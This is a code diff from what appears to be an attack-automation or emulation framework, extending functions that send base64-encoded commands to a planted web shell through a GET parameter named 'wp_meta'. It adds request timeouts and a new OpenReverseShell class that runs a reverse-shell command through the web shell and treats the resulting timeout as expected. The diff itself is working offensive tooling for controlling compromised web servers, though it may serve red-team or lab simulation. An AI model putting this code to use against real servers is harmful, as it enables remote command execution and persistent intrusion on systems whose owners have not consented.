@@ -520,6 +520,7 @@ def send_request(
     cmd: List[str],
     cmd_param: str = "wp_meta",
     verify: bool = False,
+    timeout: Optional[float] = None,
 ) -> List[str]:
     """Sends a b64 encoded web shell command via the given GET param.
 
@@ -529,6 +530,7 @@ def send_request(
         cmd: The command and its arguments as a list
         cmd_param: The GET parameter to embed the command in.
         verify: If HTTPS connection should very TLS certs
+        timeout: The maximum time to wait for the web server to respond
 
     Returns:
         The commands output lines
@@ -538,7 +540,7 @@ def send_request(
     log = log.bind(params=get_params)
 
     log.info("Sending web shell command")
-    r = requests.get(url, params=get_params, verify=verify)
+    r = requests.get(url, params=get_params, verify=verify, timeout=timeout)
     log.info("Sent web shell command")
 
     return decode_response(r.text)
@@ -552,16 +554,19 @@ class ExecWebShellCommand:
         cmd: List[str],
         cmd_param: str = "wp_meta",
         verify: bool = False,
+        timeout: Optional[float] = None,
     ):
         """
         Args:
             cmd: The command and its arguments to execute
             cmd_param: The GET parameter to send the command in
             verify: If the TLS certs should be verified or not
+            timeout: The maximum time to wait for the web server to respond
         """
         self.cmd: List[str] = cmd
         self.cmd_param: str = cmd_param
         self.verify: bool = verify
+        self.timeout: Optional[float] = timeout
 
     def __call__(
         self,
@@ -572,8 +577,45 @@ class ExecWebShellCommand:
     ):
         web_shell = context.web_shell
         log = log.bind(cmd=self.cmd, cmd_param=self.cmd_param, web_shell=web_shell)
-        output = send_request(log, web_shell, self.cmd, self.cmd_param, self.verify)
-        log.info("Web shell command response", output=output)
+        if web_shell is not None:
+            output = send_request(
+                log, web_shell, self.cmd, self.cmd_param, self.verify, self.timeout
+            )
+            log.info("Web shell command response", output=output)
+        else:
+            log.error("Missing web shell url")
+            raise Exception("No web shell to execute at")
+
+
+class OpenReverseShell(ExecWebShellCommand):
+    def __init__(
+        self,
+        cmd: List[str],
+        cmd_param: str = "wp_meta",
+        verify: bool = False,
+        timeout: float = 25,
+    ):
+        """
+        Args:
+            cmd: The reverse shell command and its arguments to execute
+            cmd_param: The GET parameter to send the command in
+            verify: If the TLS certs should be verified or not
+            timeout: The maximum time to wait for the web server to respond
+        """
+        super().__init__(cmd, cmd_param=cmd_param, verify=verify, timeout=timeout)
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        log.info("Starting reverse shell")
+        try:
+            super().__call__(log, current_state, context, target)
+        except TimeoutError:
+            log.info("Received request timeout")
 
 
 class WaitUntilNext:
